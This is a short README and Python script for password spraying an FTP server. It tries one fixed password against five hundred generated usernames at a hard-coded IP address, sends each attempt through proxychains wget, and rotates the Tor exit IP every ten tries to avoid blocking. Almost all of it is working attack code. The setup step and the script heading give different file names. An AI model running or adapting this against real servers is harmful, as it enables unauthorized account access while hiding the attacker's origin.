# Password Spraying FTP

## Setup
```bash
pip3 install stem
python3 ftp.py
```

## Script main.py

```python
#!/usr/bin/env python3

#pip3 install stem
import os
import time
from stem import Signal
from stem.control import Controller

preix_user = 'user_'
min_user = 120000
max_user = 120500

def renew_tor_ip(controlport):
    with Controller.from_port(port=controlport) as controller:
        controller.authenticate(password="secret")
        controller.signal(Signal.NEWNYM)
        print('New IP')
        time.sleep(15)


renew_tor_ip(9051)
count = 1
for i in range(min_user, max_user):
    errorcode = os.system('proxychains wget ftp://' + preix_user + str(i) + ':04f44668@152.96.6.197:21')
    print('Errorcode: ' + str(errorcode))
    if not errorcode == 1536:
        print('FTP says yes: ' + preix_user + str(i))
        exit(0)

    if count == 10:
        renew_tor_ip(9051)
        count = 1

    count += 1

```